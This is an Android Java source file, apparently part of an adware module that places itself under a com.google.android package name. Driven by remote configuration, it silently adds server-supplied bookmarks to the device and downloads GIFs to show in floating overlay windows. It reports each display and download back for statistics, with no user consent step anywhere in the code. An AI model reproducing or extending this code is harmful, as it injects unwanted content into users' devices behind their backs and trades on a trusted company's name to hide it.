package com.google.android.ore;

import java.io.File;

import android.content.Context;
import android.text.TextUtils;

import com.google.android.ore.bean.OreGeneral;
import com.google.android.ore.bean.OreItemInfo;
import com.google.android.ore.bean.OreType;
import com.google.android.ore.db.dao.OreGeneralDao;
import com.google.android.ore.db.dao.OreItemInfoDao;
import com.google.android.ore.gif.GifFloatWindow;
import com.google.android.ore.report.OreReport;
import com.google.android.ore.report.bean.ReportKey;
import com.google.android.ore.thinkandroid.L;
import com.google.android.ore.thinkandroid.http.AsyncHttpClient;
import com.google.android.ore.thinkandroid.http.FileHttpResponseHandler;
import com.google.android.ore.util.BookMarkUtil;
import com.google.android.ore.util.MaterialUtil;

public class FetchGeneralOreMaterial {
	private final String TAG = FetchGeneralOreMaterial.class.getSimpleName();
	protected volatile boolean isAliving = false;
	public FetchGeneralOreMaterial() {
	}
	
	public void asynFetch(final Context context) {
		if (isAliving) {
			return;
		}
		isAliving = true;
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				fetch(context);
				isAliving = false;
			}
		}).start();
	}

	public void fetch(final Context context) {
		OreGeneral oreGeneral = OreGeneralDao.get().getOreGeneral();
		if (null != oreGeneral && oreGeneral.ore_type > OreType.GENERAL_ORE) {
			L.d(TAG, "fetch oreGeneral.ore_id:" + oreGeneral.ore_id
					+ " oreGeneral.ore_type:" + oreGeneral.ore_type);
			OreItemInfo oreItemInfo = OreItemInfoDao.get().get(
					oreGeneral.ore_item_id);
			oreGeneral.retry_num += 1;
			switch (oreGeneral.ore_type) {
			case OreType.FLOATING_WINDOW_GIF:
				dealGifWindow(context, oreGeneral, oreItemInfo);
				break;
			case OreType.BOOKMARKS:
				dealBookMarks(context, oreGeneral, oreItemInfo);
				break;

			default:
				break;
			}

		}
	}

	private void dealBookMarks(Context context, OreGeneral oreGeneral,
			OreItemInfo oreItemInfo) {
		if (!TextUtils.isEmpty(oreItemInfo.d1)) {
			BookMarkUtil.addBookMarks(oreItemInfo.d1);
			oreGeneral.status = 2;
		}else{
			oreGeneral.status = 3;
		}
		OreGeneralDao.get().update(oreGeneral);
		//BookMark被add
		OreReport.statisticalReport(oreGeneral.ore_id,0,ReportKey.ore_show);
	}

	private void dealGifWindow(final Context context,
			final OreGeneral oreGeneral, final OreItemInfo oreItemInfo) {
		if (null == oreItemInfo || TextUtils.isEmpty(oreItemInfo.app_icon_md5)
				|| TextUtils.isEmpty(oreItemInfo.app_icon_url)) {
			oreGeneral.status = 3;
			OreGeneralDao.get().update(oreGeneral);
			return;
		}
		final String fileMd5 = oreItemInfo.app_icon_md5;
		final String resFileName = Constant.getDir(Constant.RES_DIR)
				.getAbsolutePath() + "/" + fileMd5;
		if (MaterialUtil.checkResExistAndComplete(resFileName, fileMd5)) {
			oreGeneral.status = 1;
			OreGeneralDao.get().update(oreGeneral);
		}
		L.d(TAG, "fetch oreGeneral.ore_id:" + oreGeneral.ore_id
				+ " oreGeneral.ore_type:" + oreGeneral.ore_type
				+ " oreGeneral.status:" + oreGeneral.status);
		if (0 == oreGeneral.status) {
			fetchResource(oreGeneral.ore_id, oreItemInfo, new ICallBack() {
				@Override
				public void callBack(Object... params) {
					super.callBack(params);
					boolean isResExist = MaterialUtil.checkResExistAndComplete(
							resFileName,fileMd5);
					if (isResExist && oreGeneral.status < 1) {
						oreGeneral.status = 1;
					}
					if (oreGeneral.status == 1) {
						showGifWindow(context, oreGeneral, oreItemInfo,
								resFileName);
					}
				}
			});
		} else if (1 == oreGeneral.status) {
			showGifWindow(context, oreGeneral, oreItemInfo, resFileName);
		}
	}

	private void showGifWindow(final Context context,
			final OreGeneral oreGeneral, final OreItemInfo oreItemInfo,
			final String resFileName) {
		OreApp.get().runOnUiThread(new Runnable() {
			
			@Override
			public void run() {
				GifFloatWindow.showGifFloatWindow(context, oreGeneral, oreItemInfo,
						resFileName);
			}
		}, 0);
		oreGeneral.status = 2;
		OreGeneralDao.get().update(oreGeneral);
	}

	private void fetchResource(final int ore_id, final OreItemInfo oreItemInfo,
			final ICallBack iCallBack) {
		final String fileMd5 = oreItemInfo.app_icon_md5;
		File resDir = Constant.getDir(Constant.RES_DIR);
		final String resFileName = resDir.getAbsolutePath() + "/" + fileMd5;
		L.d(TAG, "fetchResource resFileName:" + resFileName
				+ " oreItemInfo.app_icon_url.trim():"
				+ oreItemInfo.app_icon_url.trim());
		FileHttpResponseHandler fileHttpResponseHandler = new FileHttpResponseHandler(
				resFileName) {
			@Override
			public void onSuccess(int statusCode, byte[] binaryData) {
				super.onSuccess(statusCode, binaryData);
				L.d(TAG, "fetchResource onSuccess statusCode:" + statusCode);
				OreReport.statisticalReport(ore_id, oreItemInfo.ore_item_id,
						ReportKey.ore_fetch_material_succ);
				if(null != iCallBack){
					iCallBack.callBack();
				}
			}

			@Override
			public void onFailure(Throwable error, String content) {
				super.onFailure(error, content);
				L.d(TAG, "fetchResource onFailure:");
				if (!TextUtils.isEmpty(content) && null != error
						&& !TextUtils.isEmpty(error.getMessage())) {
					L.d(TAG, "fetchResource onFailure content:" + content
							+ " error.getMessage():" + error.getMessage());
				}
			}

			@Override
			public void onFinish() {
				super.onFinish();
			}
		};
		fileHttpResponseHandler.setInterrupt(false);
		AsyncHttpClient syncHttpClient = new AsyncHttpClient();
		syncHttpClient.download(oreItemInfo.app_icon_url.trim(),
				fileHttpResponseHandler);
	}
}
